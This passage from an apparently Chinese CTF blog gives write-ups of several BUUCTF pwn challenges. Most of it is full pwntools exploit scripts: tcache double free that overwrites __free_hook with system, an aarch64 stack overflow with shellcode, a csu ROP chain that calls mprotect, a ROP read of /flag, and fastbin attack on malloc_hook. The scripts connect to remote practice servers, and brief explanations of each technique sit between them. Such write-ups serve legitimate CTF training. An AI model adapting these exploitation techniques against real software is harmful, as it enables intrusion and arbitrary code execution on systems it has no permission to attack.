class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):<br>    r.recvuntil(<span class="hljs-string">&#x27;Give me the point(1~6): &#x27;</span>)<br>    r.sendline(a[i])<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="xm-2019-awd-pwn2">xm_2019_awd_pwn2</h3><p>这题限制最多创建18个堆，libc2.27加了doublefree检测的话，用fastbin_attack，就差一个堆就可以做出来，（不知是不是awd，被修过）而buu的远端是老版本没有doublefree检测，用tcache doublefree就可以解出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./xm_2019_awd_pwn2&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;&#x27;</span>, )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims          :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#---------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;size:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&#x27;content:&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;idx&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;idx&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#-------------------</span><br>add(<span class="hljs-number">0x410</span>,<span class="hljs-string">&#x27;pppp&#x27;</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<span class="hljs-comment">#1</span><br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>malloc_hook=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])-<span class="hljs-number">96</span>-<span class="hljs-number">0x10</span><br>libc_base=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(libc_base)<br>free_hook=libc_base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>)<span class="hljs-comment">#8</span><br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;&#x27;</span>)<span class="hljs-comment">#9</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    free(i+<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">8</span>)<br>free(<span class="hljs-number">9</span>)<br>free(<span class="hljs-number">8</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<span class="hljs-comment">#15</span><br>add(<span class="hljs-number">0x68</span>,p64(malloc_hook-<span class="hljs-number">0x23</span>))<span class="hljs-comment">#16</span><br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;&#x27;</span>)<span class="hljs-comment">#17</span><br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;&#x27;</span>)<span class="hljs-comment">#18</span><br><span class="hljs-comment">#add(0x68,&#x27;&#x27;)#19</span><br>debug()<br><br>r.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./xm_2019_awd_pwn2&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25368</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims          :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#---------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;size:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&#x27;content:&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;idx&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;idx&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#-------------------</span><br>add(<span class="hljs-number">0x410</span>,<span class="hljs-string">&#x27;pppp&#x27;</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<span class="hljs-comment">#1</span><br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>malloc_hook=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])-<span class="hljs-number">96</span>-<span class="hljs-number">0x10</span><br>libc_base=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(libc_base)<br>free_hook=libc_base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-comment">#------------------------</span><br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x10</span>,p64(free_hook))<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>add(<span class="hljs-number">0x10</span>,p64(system))<br>free(<span class="hljs-number">3</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="shanghai2018-baby-arm">shanghai2018_baby_arm</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r= process([<span class="hljs-string">&quot;qemu-aarch64&quot;</span>, <span class="hljs-string">&quot;-L&quot;</span>, <span class="hljs-string">&quot;/usr/aarch64-linux-gnu&quot;</span>, <span class="hljs-string">&quot;./pwn&quot;</span>])<br><span class="hljs-comment">#r=remote(&#x27;node4.buuoj.cn&#x27;,28119)</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.binary = <span class="hljs-string">&quot;./pwn&quot;</span><br>shell=asm(shellcraft.sh())<br>r.sendlineafter(<span class="hljs-string">&#x27;Name:&#x27;</span>,shell)<br>payload=cyclic(<span class="hljs-number">72</span>)+p64(<span class="hljs-number">0x411068</span>)<br>r.sendline(payload)<br><span class="hljs-comment">#gdb.attach(r)</span><br>r.interactive()<br></code></pre></td></tr></table></figure><p>栈溢出，然后利用scu的ROPgadget进行rop，用mprotect提权bss段，后执行bss段的shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r= process([<span class="hljs-string">&quot;qemu-aarch64&quot;</span>, <span class="hljs-string">&quot;-L&quot;</span>, <span class="hljs-string">&quot;/usr/aarch64-linux-gnu&quot;</span>, <span class="hljs-string">&quot;./pwn&quot;</span>])<br><span class="hljs-comment">#r=remote(&#x27;node4.buuoj.cn&#x27;,28119)</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.binary = <span class="hljs-string">&quot;./pwn&quot;</span><br>shell=p64(elf.plt[<span class="hljs-string">&#x27;mprotect&#x27;</span>])+asm(shellcraft.sh())<br>r.sendlineafter(<span class="hljs-string">&#x27;Name:&#x27;</span>,shell)<br><span class="hljs-comment">#----------------------------</span><br>csu_down=<span class="hljs-number">0x4008CC</span><br>csu_up=<span class="hljs-number">0x4008AC</span><br>mprotect_addr=<span class="hljs-number">0x411068</span><br>shell_addr=<span class="hljs-number">0x411068</span>+<span class="hljs-number">8</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">csu_rop</span>(<span class="hljs-params">fun,v1,v2,v3</span>):<br>    csu_down=<span class="hljs-number">0x4008CC</span><br>    csu_up=<span class="hljs-number">0x4008AC</span><br>    payload=p64(csu_down)+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(csu_up)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)<br>    payload+=p64(fun)+p64(v3)+p64(v2)+p64(v1)<br>    <span class="hljs-keyword">return</span> payload<br>payload=cyclic(<span class="hljs-number">72</span>)+csu_rop(mprotect_addr,shell_addr,<span class="hljs-number">0x1000</span>,<span class="hljs-number">7</span>)+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(shell_addr)<br><br>r.sendline(payload)<br><span class="hljs-comment">#gdb.attach(r)</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="0CTF-2016-warmup">0CTF_2016_warmup</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./warmup&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26363</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br><span class="hljs-comment">#----------------------------------------------------------------------</span><br>main_addr=<span class="hljs-number">0x0804815A</span><br>write_addr=<span class="hljs-number">0x08048135</span><br>read_addr=<span class="hljs-number">0x0804811D</span><br>alarm_addr=<span class="hljs-number">0x0804810D</span><br>data=<span class="hljs-number">0x080491BC</span><br>syscall=<span class="hljs-number">0x08048122</span><br>r.send(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p32(read_addr)+p32(main_addr)+p32(<span class="hljs-number">0</span>)+p32(data)+p32(<span class="hljs-number">0x8</span>))<br>r.sendafter(<span class="hljs-string">&#x27;Good Luck!\n&#x27;</span>,<span class="hljs-string">&#x27;/flag&#x27;</span>.ljust(<span class="hljs-number">0x8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>sleep(<span class="hljs-number">0xa</span>-<span class="hljs-number">0x5</span>)<br><span class="hljs-comment">#-------------------------------orw----------------------------------</span><br>r.send(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p32(alarm_addr)+p32(syscall)+p32(main_addr)+p32(data)+p32(<span class="hljs-number">0</span>))<br>r.sendafter(<span class="hljs-string">&#x27;Good Luck!\n&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p32(read_addr)+p32(main_addr)+p32(<span class="hljs-number">3</span>)+p32(data)+p32(<span class="hljs-number">0x30</span>))<br>r.sendafter(<span class="hljs-string">&#x27;Good Luck!\n&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p32(write_addr)+p32(main_addr)+p32(<span class="hljs-number">1</span>)+p32(data)+p32(<span class="hljs-number">0x30</span>))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="SWPUCTF-2019-login">SWPUCTF_2019_login</h3><p>非栈上格式化字符串利用</p><p>如果堆题，保护got表可写，和没开pie的话，就是要用劫持got来做，show来泄露got得到libcbase</p><h3 id="babyheap-0ctf-2017-2">babyheap_0ctf_2017:</h3><h4 id="功能分析：">功能分析：</h4><p>常规菜单题，功能齐全</p><h4 id="漏洞点：堆溢出">漏洞点：堆溢出</h4><p>可以堆溢出，add函数和fill函数分开，fill填的大小没有检查。</p><h4 id="利用方法：">利用方法：</h4><p><strong>堆溢出-&gt;unsortbin  leak-&gt;堆分配至malloc_hook-&gt;劫持hook为og</strong></p><p>1.堆溢出修改chunk大小至少为0x91（unsortbin最小大小），free到unsortbin，unsortbin里fd和bk有指向main_areana+88地址，申请堆块，其地址会对应下移，申请堆块使其地址到一个正在使用的堆块，用show函数泄露了malloc_hook地址，再得出libc_base，libc_base+malloc,libc+og。</p><p>2.释放0x60堆块，运用堆溢出改free块的bin链到malloc_hook-0x23处，（libc2.23用0x7f绕过检查），申请两次后，申请堆块到malloc_hook-0x23处，填入og，最后申请add触发。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./babyheap_0ctf_2017&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/2.23/libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">25542</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span 